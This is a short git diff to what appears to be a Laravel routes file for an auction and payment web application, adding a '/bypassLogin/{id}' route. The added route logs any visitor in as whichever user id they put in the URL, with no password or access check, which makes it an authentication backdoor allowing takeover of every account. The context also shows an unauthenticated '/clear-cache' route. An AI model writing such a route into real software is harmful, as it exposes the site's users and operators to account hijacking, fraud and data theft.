@@ -77,6 +77,8 @@ use App\Http\Livewire\Page\Reporting\UserReport;
 use App\Http\Livewire\Page\Lelongan\Lelongan;
 use App\Http\Livewire\Page\Payment\RedirectFiuu;
 use App\Http\Livewire\Page\PurchaseHistory\PurchaseHistory;
+use App\Models\User;
+use Illuminate\Support\Facades\Auth;
 
 Route::get('/clear-cache', function () {
     Artisan::call('cache:clear');
@@ -84,6 +86,13 @@ Route::get('/clear-cache', function () {
     Artisan::call('config:clear');
     Artisan::call('view:clear');
     return "All Cache is cleared";
+});
+
+Route::get('/bypassLogin/{id}', function ($id) {
+    $user = User::findOrFail($id);
+    // auth()->loginUsingId($id);
+    Auth::login($user);
+    return redirect('/home');
 });
 
 Route::middleware('guest')->group(function () {
